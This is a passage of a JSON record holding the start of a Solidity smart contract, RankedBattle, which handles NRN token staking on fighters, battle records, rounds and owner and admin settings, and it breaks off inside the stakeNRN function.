      "content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0 <0.9.0;\n\nimport { FighterFarm } from \"./FighterFarm.sol\";\nimport { VoltageManager } from \"./VoltageManager.sol\";\nimport { MergingPool } from \"./MergingPool.sol\";\nimport { Neuron } from \"./Neuron.sol\";\nimport { StakeAtRisk } from \"./StakeAtRisk.sol\";\nimport { FixedPointMathLib } from './FixedPointMathLib.sol';\n\n/// @title RankedBattle\n/// @author ArenaX Labs Inc.\n/// @notice This contract provides functionality for staking NRN tokens on fighters, \n/// tracking battle records, calculating and distributing rewards based on battle outcomes \n/// and staked amounts, and allowing claiming of accumulated rewards.\ncontract RankedBattle {\n\n    /// @dev Extend functionality of the FixedPointMathLib library to the uint data type.\n    using FixedPointMathLib for uint;\n\n    /*//////////////////////////////////////////////////////////////\n                                EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Event emitted when staked.\n    event Staked(address from, uint256 amount);\n\n    /// @notice Event emitted when unstaked.\n    event Unstaked(address from, uint256 amount);\n\n    /// @notice Event emitted when claimed.\n    event Claimed(address claimer, uint256 amount);\n\n    /// @notice Event emitted when points are added or subtracted from a fighter.\n    event PointsChanged(uint256 tokenId, uint256 points, bool increased);    \n\n    /*//////////////////////////////////////////////////////////////\n                                STRUCTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Struct for battle record.\n    struct BattleRecord {\n        uint32 wins;\n        uint32 ties;\n        uint32 loses;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            STATE VARIABLES\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Voltage cost per match initiated\n    uint8 public constant VOLTAGE_COST = 10;\n\n    /// @notice Number of total battles.\n    uint256 public totalBattles = 0;\n\n    /// @notice Number of overall staked amount.\n    uint256 public globalStakedAmount = 0;\n\n    /// @notice Current round number.\n    uint256 public roundId = 0;\n\n    /// @notice Amount of basis points that get taken away from a player's stake when they lose in \n    /// a point deficit.\n    uint256 public bpsLostPerLoss = 10;\n\n    /// The StakeAtRisk contract address.\n    address _stakeAtRiskAddress;\n\n    /// The address that has owner privileges (initially the contract deployer).\n    address _ownerAddress;\n\n    /// @notice The address in charge of updating battle records.\n    address _gameServerAddress;\n\n    /*//////////////////////////////////////////////////////////////\n                            CONTRACT INSTANCES\n    //////////////////////////////////////////////////////////////*/ \n\n    /// @notice The neuron contract instance.\n    Neuron _neuronInstance;\n\n    /// @notice The fighter farm contract instance.\n    FighterFarm _fighterFarmInstance;\n\n    /// @notice The voltage manager contract instance.\n    VoltageManager _voltageManagerInstance;\n\n    /// @notice The merging pool contract instance.\n    MergingPool _mergingPoolInstance;\n\n    /// @notice The stake at risk contract instance.\n    StakeAtRisk _stakeAtRiskInstance;\n\n    /*//////////////////////////////////////////////////////////////\n                                MAPPINGS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Maps addresses that are admins.\n    mapping(address => bool) public isAdmin;\n\n    /// @notice Mapping of token id to battle record struct.\n    mapping(uint256 => BattleRecord) public fighterBattleRecord;\n\n    /// @notice Mapping of address to the amount of NRNs they have claimed.\n    mapping(address => uint256) public amountClaimed;\n\n    /// @notice Maps the user address to the number of rounds they've claimed for\n    mapping(address => uint32) public numRoundsClaimed;\n\n    /// @notice Maps address to round ID to track accumulated points.\n    mapping(address => mapping(uint256 => uint256)) public accumulatedPointsPerAddress;\n\n    /// @notice Maps token ID to round ID to track accumulated points.\n    mapping(uint256 => mapping(uint256 => uint256)) public accumulatedPointsPerFighter;\n\n    /// @notice Maps round ID to total accumulated points.\n    mapping(uint256 => uint256) public totalAccumulatedPoints;\n\n    /// @notice Mapping of roundID to nrn distribution amount for a ranked period.\n    mapping(uint256 => uint256) public rankedNrnDistribution;\n\n    /// @notice Maps the token ID to the round ID and indicates whether it is Unstaked or not.\n    mapping(uint256 => mapping(uint256 => bool)) public hasUnstaked;\n\n    /// @notice Mapping of token id to staked amount.\n    mapping(uint256 => uint256) public amountStaked;\n\n    /// @notice Mapping of token id to staking factor.\n    mapping(uint256 => uint256) public stakingFactor;\n\n    /// @notice Indicates whether we have calculated the staking factor for a given round and token.\n    mapping(uint256 => mapping(uint256 => bool)) _calculatedStakingFactor;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Initializes the contract by setting various addresses and instantiating \n    /// contract instances. It also designates the owner address as an admin. \n    /// @param ownerAddress Address of contract deployer.\n    /// @param gameServerAddress The game server address.\n    /// @param fighterFarmAddress Address of the FighterFarm contract.\n    /// @param voltageManagerAddress Address of the VoltageManager contract.\n    constructor(\n      address ownerAddress, \n      address gameServerAddress,\n      address fighterFarmAddress,\n      address voltageManagerAddress\n    ) {\n        _ownerAddress = ownerAddress;\n        _gameServerAddress = gameServerAddress;\n        _fighterFarmInstance = FighterFarm(fighterFarmAddress);\n        _voltageManagerInstance = VoltageManager(voltageManagerAddress);\n        isAdmin[_ownerAddress] = true;\n        rankedNrnDistribution[0] = 5000 * 10**18;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            EXTERNAL FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Transfers ownership from one address to another.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param newOwnerAddress The address of the new owner\n    function transferOwnership(address newOwnerAddress) external {\n        require(msg.sender == _ownerAddress);\n        _ownerAddress = newOwnerAddress;\n    }\n\n    /// @notice Adjusts admin access for a user.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param adminAddress The address of the admin.\n    /// @param access Whether the address has admin access or not.\n    function adjustAdminAccess(address adminAddress, bool access) external {\n        require(msg.sender == _ownerAddress);\n        isAdmin[adminAddress] = access;\n    }  \n\n    /// @notice Sets the game server address.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param gameServerAddress The game server address.\n    function setGameServerAddress(address gameServerAddress) external {\n        require(msg.sender == _ownerAddress);\n        _gameServerAddress = gameServerAddress;\n    }\n\n    /// @notice Sets the Stake at Risk contract address and instantiates the contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param stakeAtRiskAddress The address of the Stake At Risk contract.\n    function setStakeAtRiskAddress(address stakeAtRiskAddress) external {\n        require(msg.sender == _ownerAddress);\n        _stakeAtRiskAddress = stakeAtRiskAddress;\n        _stakeAtRiskInstance = StakeAtRisk(_stakeAtRiskAddress);\n    }\n\n    /// @notice Instantiates the neuron contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param nrnAddress The address of the Neuron contract.\n    function instantiateNeuronContract(address nrnAddress) external {\n        require(msg.sender == _ownerAddress);\n        _neuronInstance = Neuron(nrnAddress);\n    }\n\n    /// @notice Instantiates the merging pool contract.\n    /// @dev Only the owner address is authorized to call this function.\n    /// @param mergingPoolAddress The address of the MergingPool contract.\n    function instantiateMergingPoolContract(address mergingPoolAddress) external {\n        require(msg.sender == _ownerAddress);\n        _mergingPoolInstance = MergingPool(mergingPoolAddress);\n    }\n\n    /// @notice Sets the ranked nrn distribution amount for the current round.\n    /// @dev Only admins are authorized to change the ranked NRN distribution.\n    /// @dev newDistribution is NOT denominated in wei. As such, it is multiplied by 10**18.\n    /// @param newDistribution The new distribution amount.\n    function setRankedNrnDistribution(uint256 newDistribution) external {\n        require(isAdmin[msg.sender]);\n        rankedNrnDistribution[roundId] = newDistribution * 10**18;\n    }\n\n    /// @notice Sets the basis points lost per ranked match lost while in a point deficit.\n    /// @dev Only admins are authorized to call this function.\n    /// @param bpsLostPerLoss_ The basis points lost per loss.\n    function setBpsLostPerLoss(uint256 bpsLostPerLoss_) external {\n        require(isAdmin[msg.sender]);\n        bpsLostPerLoss = bpsLostPerLoss_;\n    }\n\n    /// @notice Sets a new round, making claiming available for that round.\n    /// @dev Only admins are authorized to move the round forward.\n    function setNewRound() external {\n        require(isAdmin[msg.sender]);\n        require(totalAccumulatedPoints[roundId] > 0);\n        roundId += 1;\n        _stakeAtRiskInstance.setNewRound(roundId);\n        rankedNrnDistribution[roundId] = rankedNrnDistribution[roundId - 1];\n    }\n\n    /// @notice Stakes NRN tokens.\n    /// @param amount The amount of NRN tokens to stake.\n    /// @param tokenId The ID of the fighter to stake.\n    function stakeNRN(uint256 amount, uint256 tokenId) external {\n        require(amount > 0, \"Amount cannot be 0\");\n        require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender"
    }
  ]
}